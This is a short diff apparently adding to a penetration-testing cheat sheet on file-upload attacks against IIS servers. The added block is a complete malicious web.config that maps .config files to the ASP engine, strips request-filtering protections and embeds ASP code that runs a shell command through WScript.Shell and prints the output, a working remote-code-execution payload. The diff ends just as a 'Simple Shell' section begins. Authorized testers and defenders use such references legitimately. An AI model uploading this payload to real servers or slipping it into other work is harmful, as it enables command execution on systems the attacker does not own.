@@ -43,6 +43,40 @@ Other extensions:
 
 RCE by uploading a `web.config` file: https://web.archive.org/web/20200808062615/https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
 
+Contents of `web.config`
+```CSS
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+   <appSettings>
+</appSettings>
+</configuration>
+<!–-
+<% Response.write("-"&"->")
+Response.write("<pre>")
+Set wShell1 = CreateObject("WScript.Shell")
+Set cmd1 = wShell1.Exec("whoami")
+output1 = cmd1.StdOut.Readall()
+set cmd1 = nothing: Set wShell1 = nothing
+Response.write(output1)
+Response.write("</pre><!-"&"-") %>
+-–>
+```
+
 Simple Shell:
 ```CSS
 <%
